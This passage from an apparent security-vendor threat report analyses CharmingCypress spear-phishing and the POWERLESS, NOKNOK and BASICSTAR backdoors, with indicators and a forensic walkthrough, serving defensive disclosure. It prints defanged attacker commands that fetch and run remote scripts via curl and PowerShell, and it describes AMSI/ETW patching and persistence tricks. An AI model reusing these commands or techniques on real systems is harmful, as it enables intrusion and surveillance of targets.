<p style="font-weight: 400;">In June 2023, Volexity <a href="https://www.volexity.com/blog/2023/06/28/charming-kitten-updates-powerstar-with-an-interplanetary-twist/">published a post about POWERSTAR</a>. And while CharmingCypress has previously distributed POWERSTAR (aka GorjolEcho) and NOKNOK <a href="https://www.proofpoint.com/us/blog/threat-insight/welcome-new-york-exploring-ta453s-foray-lnks-and-mac-malware">within the same campaign</a>, the use of POWERLESS in a recently identified campaign is a new observation. Furthermore, BASICSTAR appears to be a new Visual Basic malware that has limited functional overlap with POWERSTAR.</p>
<h2>Malware Distribution Techniques</h2>
<h3>Spear Phishing</h3>
<p style="font-weight: 400;">Throughout 2023, Volexity observed a wide range of spear-phishing activity conducted by CharmingCypress. This activity included spoofing individuals from different organizations, including the use of personas tied to media organizations and research institutions. In September and October 2023, CharmingCypress engaged in a series of spear-phishing attacks in which they masqueraded as the Rasanah International Institute for Iranian Studies (IIIS). CharmingCypress registered multiple, typo-squatted domains for use in these attacks that are similar to the organization’s actual domain, rasanah-iiis[.]org.</p>
<p style="font-weight: 400;">The image below shows an example of a spear phish sent by CharmingCypress, in which the threat actor contacted a policy expert pretending to be an employee of the Rasanah Institute. The email invites the target to join a fake webinar.</p>
<p><img decoding="async" class="aligncenter size-full wp-image-3164" src="https://www.volexity.com/wp-content/uploads/2024/02/image001.png" alt="" width="1612" height="1288" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image001.png 1612w, https://www.volexity.com/wp-content/uploads/2024/02/image001-300x240.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image001-1024x818.png 1024w, https://www.volexity.com/wp-content/uploads/2024/02/image001-768x614.png 768w, https://www.volexity.com/wp-content/uploads/2024/02/image001-1536x1227.png 1536w" sizes="(max-width: 1612px) 100vw, 1612px" /></p>
<p style="font-weight: 400;">This email demonstrates the following features:</p>
<ul>
<li>An attempt to engage the target in a conversation, rather than immediately prompting them to open a malicious link or download malware</li>
<li>Impersonation of a real organization likely to be known by the target in order to construct a viable reason for the contact</li>
<li>The use of WhatsApp and Signal phone numbers, which are controlled by CharmingCypress and are offered as alternative methods of contacting the threat actor</li>
</ul>
<p style="font-weight: 400;">Other spear-phish attempts by CharmingCypress in 2023 have involved one or more of the following:</p>
<ul>
<li>URLs that start a redirection chain, culminating in the download of a RAR archive containing malicious shortcut (LNK) files</li>
<li>Use of compromised webmail accounts belonging to real contacts of the target</li>
<li>Use of multiple threat-actor controlled email accounts within the same phishing chain (which Proofpoint previously described as <a href="https://www.proofpoint.com/uk/blog/threat-insight/ta453-uses-multi-persona-impersonation-capitalize-fomo">Multi-Persona Impersonation</a>)</li>
</ul>
<h3><a id="Anchor1"></a>RAR + LNK Combo</h3>
<p style="font-weight: 400;">In 2023 CharmingCypress often used RAR archives containing LNK files to deliver malware during spear-phishing campaigns. The infection chain from a recent campaign conducted by CharmingCypress is shown below.</p>
<p><img decoding="async" class="aligncenter size-full wp-image-3163" src="https://www.volexity.com/wp-content/uploads/2024/02/image002-1.png" alt="" width="1376" height="646" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image002-1.png 1376w, https://www.volexity.com/wp-content/uploads/2024/02/image002-1-300x141.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image002-1-1024x481.png 1024w, https://www.volexity.com/wp-content/uploads/2024/02/image002-1-768x361.png 768w" sizes="(max-width: 1376px) 100vw, 1376px" /></p>
<p style="font-weight: 400;">After initial contact with the target was established and matured, an OnRender URL (<code>hxxps://cloud-document-edit.onrender[.]com/page/jujbMKB[snipped]TpCNvV</code>) was shared with the target. This URL redirected to a password-protected RAR file hosted on Supabase (<code>hxxps://wulpfsrqupnuqorhexiw.supabase[.]co/storage/v1/object/public/StarPj/Items%20Shared.rar</code>). The password for this RAR was shared in a subsequent email.</p>
<p style="font-weight: 400;">The RAR file contained two LNK files:</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Name(s)</strong></td>
<td width="511">The global consequences of the Israel-Hamas war - Shortcut.lnk</td>
</tr>
<tr>
<td width="312"><strong>Size</strong></td>
<td width="511">1.9KB (1945 Bytes)</td>
</tr>
<tr>
<td width="312"><strong>File Type</strong></td>
<td width="511">LNK</td>
</tr>
<tr>
<td width="312"><strong>MD5</strong></td>
<td width="511">3fbf3ce1a9b452421970810bd6b6b37a</td>
</tr>
<tr>
<td width="312"><strong>SHA1</strong></td>
<td width="511">729346dfdd2203a9943119bac03419d63554c4b8</td>
</tr>
</tbody>
</table>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Name(s)</strong></td>
<td width="508">US strategy in the Middle East is coming into focus - Shortcut.lnk</td>
</tr>
<tr>
<td width="312"><strong>Size</strong></td>
<td width="508">2.3KB (2371 Bytes)</td>
</tr>
<tr>
<td width="312"><strong>File Type</strong></td>
<td width="508">LNK</td>
</tr>
<tr>
<td width="312"><strong>MD5</strong></td>
<td width="508">78e4975dc56e62226f4c56850efb452b</td>
</tr>
<tr>
<td width="312"><strong>SHA1</strong></td>
<td width="508">1f974d7634103536e524a41a79046785ca7ae3d6</td>
</tr>
</tbody>
</table>
<p style="font-weight: 400;">The names of these files were copied from recent articles published by Atlantic Council in order to appeal to the victim. Each LNK has its own unique infection workflow. However, both will ultimately open a remotely-hosted decoy document and download a malware component. Both LNK files make use of string-replacement to obfuscate commands.</p>
<p style="font-weight: 400;">The following defanged command, embedded in <code>The global consequences of the Israel-Hamas war - Shortcut.lnk</code>, downloads and executes BASICSTAR, which is discussed in further detail <a href="#Anchor2">later in this blog post</a>.</p>
<pre style="font-weight: 400;">/c set c=cu7rl --s7sl-no-rev7oke -s -d "id=VzXdED&amp;Prog=2_Mal_vbs.txt&amp;WH=The-global-.pdf" -X PO7ST hxxps://east-healthy-dress.glitch[.]me/Down -o %temp%\down.v7bs &amp; call %c:7=% &amp; set b=sta7rt "" "%temp%\down.v7bs" &amp; call %b:7=%</pre>
<p style="font-weight: 400;">The following defanged command, embedded in <code>US strategy in the Middle East is coming into focus - Shortcut.lnk</code>, downloads and executes KORKULOADER.</p>
<pre style="font-weight: 400;">/c set fg=powershetsrll.exe -w 1 "$y=(wgetsrt -Urtsri httsrtps://wulpfsrqupnuqorhexiw.supabase[.]co/storage/v1/object/public/StarPj/AUN.txt -UseBatsrsicParsing).Cotsrntent; &amp;(gctsrm *ketsr-e*)$y"; &amp; call %fg:tsr=%</pre>
<p style="font-weight: 400;">KORKULOADER is a very simple PowerShell downloader script that could not be used to obtain additional payloads at the time of investigation.</p>
<p style="font-weight: 400;">This infection chain was partially discussed in this recent <a href="https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/">Microsoft blog post</a>.</p>
<h3>Malware-laden VPN Applications</h3>
<p style="font-weight: 400;">Another recent CharmingCypress spear-phishing campaign was developed on a technique reported by <a href="https://www.proofpoint.com/us/blog/threat-insight/welcome-new-york-exploring-ta453s-foray-lnks-and-mac-malware">Proofpoint in July 2023</a> using a malware-laden VPN application to deploy malware. A high-level overview of the overall infection chain is shown below.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3162" src="https://www.volexity.com/wp-content/uploads/2024/02/image003-1.png" alt="" width="1378" height="875" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image003-1.png 1378w, https://www.volexity.com/wp-content/uploads/2024/02/image003-1-300x190.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image003-1-1024x650.png 1024w, https://www.volexity.com/wp-content/uploads/2024/02/image003-1-768x488.png 768w" sizes="(max-width: 1378px) 100vw, 1378px" /></p>
<p style="font-weight: 400;">Emails containing a link to a fake webinar platform, and credentials to enable access to it, were distributed to a small number of targeted individuals. The platform was hosted on the following subdomains:</p>
<ul>
<li><code>rasaan<strong>e</strong>h-iiis[.]org</code></li>
<li><code>rasaan<strong>a</strong>h-iiis[.]org</code></li>
</ul>
<p style="font-weight: 400;">Volexity identified emails sent using the following domains, which all mimic the legitimate rasanah-iiis[.]org domain:</p>
<ul>
<li><code>rasaneh-iiis[.]org</code></li>
<li><code>rasaanah-iiis[.]org</code></li>
<li><code>rasaaneh-iiis[.]org</code></li>
</ul>
<p style="font-weight: 400;">When users attempted to access the portal, it would check the supplied credentials. If the credentials were correct, it would then check the IP address used to access the portal. Only users running the attacker’s VPN client would successfully authenticate. If the IP address check failed, targets were prompted to download a VPN application, as shown below.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3161" src="https://www.volexity.com/wp-content/uploads/2024/02/image004-1.png" alt="" width="1381" height="887" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image004-1.png 1381w, https://www.volexity.com/wp-content/uploads/2024/02/image004-1-300x193.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image004-1-1024x658.png 1024w, https://www.volexity.com/wp-content/uploads/2024/02/image004-1-768x493.png 768w" sizes="(max-width: 1381px) 100vw, 1381px" /></p>
<p style="font-weight: 400;">Depending on the user’s operating system (determined via the user-agent used to request the page), different applications would be served to the user. The resulting VPN client was a functional VPN client laden with malware. Windows victims would be served an infection chain culminating in POWERLESS, while macOS victims would be served an infection chain culminating in NOKNOK.</p>
<p style="font-weight: 400;">The Windows VPN application shown below establishes a connection to a CharmingCypress-controlled VPN endpoint using the supplied credentials and an OpenVPN configuration file.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3160" src="https://www.volexity.com/wp-content/uploads/2024/02/image005-1.png" alt="" width="1234" height="687" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image005-1.png 1234w, https://www.volexity.com/wp-content/uploads/2024/02/image005-1-300x167.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image005-1-1024x570.png 1024w, https://www.volexity.com/wp-content/uploads/2024/02/image005-1-768x428.png 768w" sizes="(max-width: 1234px) 100vw, 1234px" /></p>
<p style="font-weight: 400;">When connected to this VPN, outbound network requests to the portal are routed through the VPN server. The macOS version achieves a similar VPN connection using the Apple utility <code><a href="https://support.apple.com/guide/remote-desktop/about-networksetup-apdd0c5a2d5/mac">networksetup</a></code> to install a SOCKS proxy to the Wi-Fi network service via the following command:</p>
<pre style="font-weight: 400;">networksetup -setsocksfirewallproxy wi-fi $serveradd $portnum</pre>
<p style="font-weight: 400;">These proxy parameters are parsed from an OVPN configuration file that contains a legitimate OpenVPN configuration with additional non-standard fields containing data used by the client. The VPN server used was hosted at <code>49.13.15[.]66</code> on UDP port <code>1194</code>.</p>
<p style="font-weight: 400;">Attempting to log on to the portal while connected to the VPN successfully passes the IP address check and allows access to the fake webinar portal.</p>
<h3>Fake Webinar Portal</h3>
<p style="font-weight: 400;">Inspecting the fake webinar portal shows the threat actor invested a significant level of effort. The portal includes the logo of the impersonated organization within a full web portal interface that includes a series of tabs:</p>
<ul>
<li><em>Dashboard tab</em> – information from the Profile and Meeting tabs</li>
<li><em>Profile tab</em> – details of the logged in user including their picture, name, title and bio</li>
<li><em>Meeting tab</em> – details of the supposed meeting to which the target was originally invited, including speakers, attendees and agenda<br />
<img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3159" src="https://www.volexity.com/wp-content/uploads/2024/02/image006-1.png" alt="" width="932" height="463" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image006-1.png 932w, https://www.volexity.com/wp-content/uploads/2024/02/image006-1-300x149.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image006-1-768x382.png 768w" sizes="(max-width: 932px) 100vw, 932px" /></li>
<li><em>Storage tab</em> – a variety of additional lure documents<br />
<img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3158" src="https://www.volexity.com/wp-content/uploads/2024/02/image007-1.png" alt="" width="663" height="305" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image007-1.png 663w, https://www.volexity.com/wp-content/uploads/2024/02/image007-1-300x138.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></li>
</ul>
<p style="font-weight: 400;">Within the portal, profiles of 16 individuals were populated and associated with a specific webinar. Volexity reverse engineered the malware-laden VPN application and identified 16 sets of MD5-hashed credentials with usernames. When these credentials were cracked, they yielded plaintext usernames associated to individuals that Volexity assesses with high confidence were targets of this campaign. All 16 individuals are experts in policy regarding the Middle East.</p>
<h2>Backdoors</h2>
<h3>POWERLESS</h3>
<p style="font-weight: 400;">The backdoor deployed by the Windows variant of the malware-laden VPN application infection chain is called POWERLESS. Previous <a href="https://research.checkpoint.com/2023/educated-manticore-iran-aligned-threat-actor-targeting-israel-via-improved-arsenal-of-tools/">reporting by Check Point</a> on POWERLESS has linked the tool to EDUCATED MANTICORE, a group Check Point assesses is “Iranian-aligned” and has “strong overlap with Phosphorous” (aka CharmingCypress). POWERLESS is a PowerShell backdoor that contains a broad feature set including the following:</p>
<ul>
<li>AES-encrypted command-and-control (C2) communication using a key passed down from the server</li>
<li>Download of additional executables for audio recording, browser information stealing, persistence, and keylogging</li>
<li>Upload/download of files</li>
<li>Execution of files</li>
<li>Execution of shell commands</li>
<li>Screenshot capture</li>
<li>Telegram information theft</li>
<li>Update configuration of POWERLESS in memory, including modification of C2 address</li>
</ul>
<p style="font-weight: 400;">These functions are largely the same as previously described by Check Point; however, the infection chain is slightly different. The malware-laden VPN application writes a malicious binary, <code>VPN.exe</code> (file details below), to the default OpenVPN directory and executes it. <code>VPN.exe</code> handles authentication via the supplied credentials and connection to the VPN.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Name(s)</strong></td>
<td width="520">VPN.exe</td>
</tr>
<tr>
<td width="312"><strong>Size</strong></td>
<td width="520">1.2MB (‍1250816 Bytes)</td>
</tr>
<tr>
<td width="312"><strong>File Type</strong></td>
<td width="520">application/x-dosexec</td>
</tr>
<tr>
<td width="312"><strong>MD5</strong></td>
<td width="520">266305f34477b679e171375e12e6880f</td>
</tr>
<tr>
<td width="312"><strong>SHA1</strong></td>
<td width="520">607137996a8dc4d449185586ecfbe886e120e6b1</td>
</tr>
</tbody>
</table>
<p style="font-weight: 400;">It also downloads a base64-encoded blob of data from the C2, writes this to disk at <code>C:\Users\Public\vconf</code>, and downloads a .NET binary named <code>cfmon.exe</code> (file details below). Persistence for cfmon.exe is achieved by adding a <code>Shell</code> registry entry in registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code> (see <a href="https://attack.mitre.org/techniques/T1547/004/">T1547.004</a> for more information on this technique).</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Name(s)</strong></td>
<td width="526">cfmon.exe</td>
</tr>
<tr>
<td width="312"><strong>Size</strong></td>
<td width="526">119.0KB (121856 Bytes)</td>
</tr>
<tr>
<td width="312"><strong>File Type</strong></td>
<td width="526">application/x-dosexec</td>
</tr>
<tr>
<td width="312"><strong>MD5</strong></td>
<td width="526">859a9e523c3308c120e82068829fab84</td>
</tr>
<tr>
<td width="312"><strong>SHA1</strong></td>
<td width="526">5bdec05bdca8176ae67054a3a7dc8c5ef0ac8deb</td>
</tr>
</tbody>
</table>
<p style="font-weight: 400;">When executed, <code>cfmon.exe</code> first patches the <code>AmsiScanBuffer</code> and <code>EtwEventWrite</code> API functions to bypass them, replacing the initial function bytes. It then decrypts the AES-encrypted file vconf, retrieved by the previous binary, yielding an obfuscated PowerShell script. This PowerShell script is executed in memory. After deobfuscating this script, Volexity identified it as a new version of the POWERLESS malware. Details of the analyzed POWERLESS sample are below.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Name(s)</strong></td>
<td width="514">N/A</td>
</tr>
<tr>
<td width="312"><strong>Size</strong></td>
<td width="514">235.0KB (240620 Bytes)</td>
</tr>
<tr>
<td width="312"><strong>File Type</strong></td>
<td width="514">text/plain</td>
</tr>
<tr>
<td width="312"><strong>MD5</strong></td>
<td width="514">c3fe93fc9133c0bc4b441798b9bcf151</td>
</tr>
<tr>
<td width="312"><strong>SHA1</strong></td>
<td width="514">87f36a0279b31a4a2f9b1123674e3dea130f1554</td>
</tr>
</tbody>
</table>
<p style="font-weight: 400;">The C2 address used by this sample of POWERLESS is <code>defaultbluemarker[.]info</code>. The following domains could be trivially linked to this domain via shared SSL certificates and/or hosting infrastructure:</p>
<ul>
<li><code>yellowparallelworld.ddns[.]net</code></li>
<li><code>beginningofgraylife.ddns[.]net</code></li>
</ul>
<p style="font-weight: 400;">Volexity was able to obtain the three additional modules used by POWERLESS, which are further described below.</p>
<h4>Browser Information Stealer</h4>
<p style="font-weight: 400;">A browser information stealer module named <code>blacksmith.exe</code> can steal passwords, cookies and browser history.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Name(s)</strong></td>
<td width="518">blacksmith.exe</td>
</tr>
<tr>
<td width="312"><strong>Size</strong></td>
<td width="518">1.6MB (‍1651200 Bytes)</td>
</tr>
<tr>
<td width="312"><strong>File Type</strong></td>
<td width="518">application/x-dosexec</td>
</tr>
<tr>
<td width="312"><strong>MD5</strong></td>
<td width="518">9b6c308f106e72394a89fac083de9934</td>
</tr>
<tr>
<td width="312"><strong>SHA1</strong></td>
<td width="518">27b38cf6667936c74ed758434196d2ac9d14deae</td>
</tr>
</tbody>
</table>
<h4>Persistence</h4>
<p style="font-weight: 400;">A persistence module downloads an executable, <code>oqeifvb.exe</code>, from the C2, writes this to <code>$env:windir\Temp\p\</code>, and executes this via the Start-Process cmdlet. This module also passes the CLSID value of the legitimate scheduled task <code><a href="https://support.microsoft.com/en-gb/topic/description-of-the-scheduled-tasks-in-windows-vista-21f93b44-7260-a612-5ec3-fb2a7be5563c">MsCtfMonitor</a></code> to <code>oqeifvb.exe</code>. POWERLESS then maintains persistence by adding the <code>HKCU\Environment\UserInitMprLogonScript</code> registry entry with a value of <code>oqeifvb.exe</code>.</p>
<p style="font-weight: 400;">The purpose of <code>oqeifvb.exe</code> is to download another file, <code>msedg.dll</code>, and establish persistence for that file by hijacking the COM handler for the <code>MsCtfMonitor</code> scheduled task using the <code>CLSID</code> retrieved earlier. Volexity was not able to obtain the additional DLL and therefore assesses CharmingCypress likely limits deployment of this additional stage to victims who have been manually approved to receive it.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Name(s)</strong></td>
<td width="527">oqeifvb.exe</td>
</tr>
<tr>
<td width="312"><strong>Size</strong></td>
<td width="527">448.5KB (459264 Bytes)</td>
</tr>
<tr>
<td width="312"><strong>File Type</strong></td>
<td width="527">application/x-dosexec</td>
</tr>
<tr>
<td width="312"><strong>MD5</strong></td>
<td width="527">c79d85d0b9175cb86ce032543fe6b0d5</td>
</tr>
<tr>
<td width="312"><strong>SHA1</strong></td>
<td width="527">195e939e0ae70453c0817ebca8049e51bbd4a825</td>
</tr>
</tbody>
</table>
<h4></h4>
<h4>Audio Recorder</h4>
<p style="font-weight: 400;">An audio recorder module named <code>AudioRecorder4.exe</code> simply captures audio using the Windows API.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Name(s)</strong></td>
<td width="522">AudioRecorder4.exe</td>
</tr>
<tr>
<td width="312"><strong>Size</strong></td>
<td width="522">344.5KB (352768 Bytes)</td>
</tr>
<tr>
<td width="312"><strong>File Type</strong></td>
<td width="522">application/x-dosexec</td>
</tr>
<tr>
<td width="312"><strong>MD5</strong></td>
<td width="522">5fc8668f9c516c2b08f34675380e2a57</td>
</tr>
<tr>
<td width="312"><strong>SHA1</strong></td>
<td width="522">c3fd8ed68c0ad2a97d76fc4430447581414e7a7e</td>
</tr>
</tbody>
</table>
<h3></h3>
<h3>NOKNOK</h3>
<p style="font-weight: 400;">The backdoor deployed by the macOS version of the malware-laden VPN application infection chain is called NOKNOK. This is downloaded by the VPN application and executed in memory. The download mechanism is identical to that described by Proofpoint <a href="https://www.proofpoint.com/us/blog/threat-insight/welcome-new-york-exploring-ta453s-foray-lnks-and-mac-malware">in their recent report</a>. For example, the download URL for this bash script shares the same <code>/DMPR/[alphanumeric string]</code> format.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3157" src="https://www.volexity.com/wp-content/uploads/2024/02/image008.png" alt="" width="981" height="182" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image008.png 981w, https://www.volexity.com/wp-content/uploads/2024/02/image008-300x56.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image008-768x142.png 768w" sizes="(max-width: 981px) 100vw, 981px" /></p>
<p style="font-weight: 400;">CharmingCypress delivers NOKNOK as a string that has been base64 encoded five times. The resulting script is the same as the previous version of the NOKNOK malware described by Proofpoint. The C2 used by this sample of NOKNOK is <code>decorous-super-blender[.]glitch[.]me</code>.</p>
<h3><a id="Anchor2"></a>BASICSTAR</h3>
<p style="font-weight: 400;">The backdoor deployed by the <a href="#Anchor1">RAR + LNK infection chain</a> is a previously undocumented backdoor that Volexity track as BASICSTAR. Details of the analyzed sample are below.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Name(s)</strong></td>
<td width="513">down.vbs</td>
</tr>
<tr>
<td width="312"><strong>Size</strong></td>
<td width="513">13.3KB (13652 Bytes)</td>
</tr>
<tr>
<td width="312"><strong>File Type</strong></td>
<td width="513">application/octet-stream</td>
</tr>
<tr>
<td width="312"><strong>MD5</strong></td>
<td width="513">2edea0927601ef443fc31f9e9f8e7a77</td>
</tr>
<tr>
<td width="312"><strong>SHA1</strong></td>
<td width="513">cdce8a3e723c376fc87be4d769d37092e6591972</td>
</tr>
</tbody>
</table>
<p style="font-weight: 400;">BASICSTAR has the following functionality:</p>
<ul>
<li>Collect the computer name, username and operating system from compromised device. This information is reversed and base64 encoded before being passed to the C2 server.</li>
<li>Download a lure PDF from the C2 and open it.</li>
<li>Download the <a href="https://www.nirsoft.net/utils/nircmd.html">NirCmd</a> command-line interface for execution of subsequent commands.</li>
<li>Enter a command loop, passing the collected information to the C2 and inspecting the returned result for a command.</li>
<li>Execute commands via the <a href="https://www.nirsoft.net/utils/nircmd.html">NirCmd</a> command-line interface.</li>
<li>Remotely execute commands relayed from the C2 (see table below).</li>
</ul>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Command</strong></td>
<td width="451"><strong>Function</strong></td>
</tr>
<tr>
<td width="312"><code>kill</code></td>
<td width="451">Delete <code>update.vbs</code>, <code>a.vbs</code>, and <code>a.ps1</code>, and then exit.</td>
</tr>
<tr>
<td width="312"><code>SetNewConfig</code></td>
<td width="451">Set a new sleep timer for the command loop.</td>
</tr>
<tr>
<td width="312"><code>Module</code></td>
<td width="451">Use <code>ModuleTitle</code>, <code>ModuleName</code> and <code>Parameters</code> to download a file, and execute this via NirCmd.</td>
</tr>
</tbody>
</table>
<p style="font-weight: 400;">Volexity was not able to obtain the additional modules used by BASICSTAR. Interestingly, the cleanup command (<code>kill</code>) deletes three files that were not observed by Volexity (<code>update.vbs</code>, <code>a.vbs</code>, and <code>a.ps1</code>). These are likely Visual Basic and PowerShell scripts downloaded in subsequent components of the attack. This capability is in line with the same command in the POWERSTAR malware family.</p>
<h4>Informations.vbs</h4>
<p style="font-weight: 400;">The latest version of BASICSTAR observed by Volexity involved a Visual Basic script named <code>Informations.vbs</code> (see below).</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="301"><strong>Name(s)</strong></td>
<td width="521">Informations.vbs</td>
</tr>
<tr>
<td width="301"><strong>Size</strong></td>
<td width="521">21.6KB (22134 Bytes)</td>
</tr>
<tr>
<td width="301"><strong>File Type</strong></td>
<td width="521">unknown</td>
</tr>
<tr>
<td width="301"><strong>MD5</strong></td>
<td width="521">853687659483d215309941dae391a68f</td>
</tr>
<tr>
<td width="301"><strong>SHA1</strong></td>
<td width="521">25005352eff725afc93214cac14f0aa8e58ca409</td>
</tr>
</tbody>
</table>
<p style="font-weight: 400;">Volexity assesses with high confidence that this script is a BASICSTAR module with an internal name of <code>Informations</code>(sic). This module uses a variety of WMI queries to gather an extensive set of information about the compromised machine, including the following:</p>
<ul>
<li>Installed antivirus products</li>
<li>Installed software</li>
<li>Information regarding the machine BIOS, hardware, manufacturer details, and disks</li>
<li>Network adapters and configurations</li>
</ul>
<p style="font-weight: 400;">The BASICSTAR sample involved in this infection chain was configured to use the Glitch domain <code>prism-west-candy[.]glitch[.]me</code> as a C2.</p>
<h2>Post-exploitation Activity &amp; Investigation with Volexity Volcano</h2>
<p style="font-weight: 400;">In one incident response case, Volexity gained some rare insight into additional tools CharmingCypress deploys if they successfully compromise a device. Volexity used <a href="https://www.volexity.com/products-overview/volcano/">Volexity Volcano</a> to analyze memory from the compromised endpoint. Despite being protected by a popular endpoint detection and response (EDR) solution, Volcano quickly showed several obvious signs of compromise.</p>
<p style="font-weight: 400;">One of Volcano’s automated IOCs (“Bad Powershell”) triggered on a script extracted from event logs. The log contains references to some of the remote systems contacted by the script, including <code>supabase[.]co</code>. Furthermore, it identifies the PID of the <code>powershell.exe</code> process (<code>13524</code>) that executed this script, as shown below.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3156" src="https://www.volexity.com/wp-content/uploads/2024/02/image009.png" alt="" width="2028" height="1236" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image009.png 2028w, https://www.volexity.com/wp-content/uploads/2024/02/image009-300x183.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image009-1024x624.png 1024w, https://www.volexity.com/wp-content/uploads/2024/02/image009-768x468.png 768w, https://www.volexity.com/wp-content/uploads/2024/02/image009-1536x936.png 1536w" sizes="(max-width: 2028px) 100vw, 2028px" /></p>
<p style="font-weight: 400;">This <code>powershell.exe</code> instance was still running, with its parent tree intact. Components of the LNK payload that downloads BASICSTAR stood out in the command-line arguments, as shown below.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3155" src="https://www.volexity.com/wp-content/uploads/2024/02/image010.png" alt="" width="2030" height="770" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image010.png 2030w, https://www.volexity.com/wp-content/uploads/2024/02/image010-300x114.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image010-1024x388.png 1024w, https://www.volexity.com/wp-content/uploads/2024/02/image010-768x291.png 768w, https://www.volexity.com/wp-content/uploads/2024/02/image010-1536x583.png 1536w" sizes="(max-width: 2030px) 100vw, 2030px" /></p>
<p style="font-weight: 400;">The process tree shows the interesting effect of string substitution. Both <code>conhost.exe</code> and cmd.exe contain obfuscated content, but the decoded arguments to <code>powershell.exe</code> were preserved in memory:</p>
<pre style="font-weight: 400;">powershell  -w 1 $pnt=(Get-Content" -Path C:\Users\&lt;redacted&gt;\AppData\Roaming\Microsoft\documentLoger.txt);&amp;(gcm "i*x)$pnt</pre>
<p style="font-weight: 400;">Armed with knowledge of the <code>documentLoger.txt</code> path, Volexity reconstructed the entire contents from the system’s file cache, as shown below.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3154" src="https://www.volexity.com/wp-content/uploads/2024/02/image011.png" alt="" width="1910" height="792" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image011.png 1910w, https://www.volexity.com/wp-content/uploads/2024/02/image011-300x124.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image011-1024x425.png 1024w, https://www.volexity.com/wp-content/uploads/2024/02/image011-768x318.png 768w, https://www.volexity.com/wp-content/uploads/2024/02/image011-1536x637.png 1536w" sizes="(max-width: 1910px) 100vw, 1910px" /></p>
<p style="font-weight: 400;">Another Volcano IOC (“Shortcut Execution”) brought attention to one of the LNK files, <code>Draft-LSE.pdf.lnk</code>, used in this attack. As shown below, this uses the icon from Microsoft Edge to trick end users.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3153" src="https://www.volexity.com/wp-content/uploads/2024/02/image012.png" alt="" width="2020" height="880" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image012.png 2020w, https://www.volexity.com/wp-content/uploads/2024/02/image012-300x131.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image012-1024x446.png 1024w, https://www.volexity.com/wp-content/uploads/2024/02/image012-768x335.png 768w, https://www.volexity.com/wp-content/uploads/2024/02/image012-1536x669.png 1536w" sizes="(max-width: 2020px) 100vw, 2020px" /></p>
<p style="font-weight: 400;">Searching memory for the source of the LNK revealed an archive file named <code>Draft-LSE (3).rar</code> in the user’s <code>Downloads</code> folder, along with a valuable set of timestamps to triage the activity, although the <code>(3)</code> in the file name suggests this was not the first time the user downloaded this file. In the MFT-resident <code>$DATA</code> attribute, the <code>ZoneTransfer</code> record showed where the file originated, as shown below.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3152" src="https://www.volexity.com/wp-content/uploads/2024/02/image013.png" alt="" width="1624" height="888" srcset="https://www.volexity.com/wp-content/uploads/2024/02/image013.png 1624w, https://www.volexity.com/wp-content/uploads/2024/02/image013-300x164.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/image013-1024x560.png 1024w, https://www.volexity.com/wp-content/uploads/2024/02/image013-768x420.png 768w, https://www.volexity.com/wp-content/uploads/2024/02/image013-1536x840.png 1536w" sizes="(max-width: 1624px) 100vw, 1624px" /></p>
<p style="font-weight: 400;">After just a few minutes of reviewing Volcano’s IOC hits and searching for related artifacts in both memory and files collected by <a href="https://www.volexity.com/products-overview/surge/">Volexity Surge Collect Pro</a>, Volexity analysts had nailed down the following evidence:</p>
<ul>
<li>The initial infection vector and the website from where it was downloaded</li>
<li>How it persisted on the endpoint</li>
<li>The list of C2 hostnames</li>
<li>Timestamps when the activity took place</li>
<li>Many other IOCs to triage</li>
<li>Working folders used by the attacker on the compromised machine</li>
</ul>
<h2>Additional Tools Used by CharmingCypress</h2>
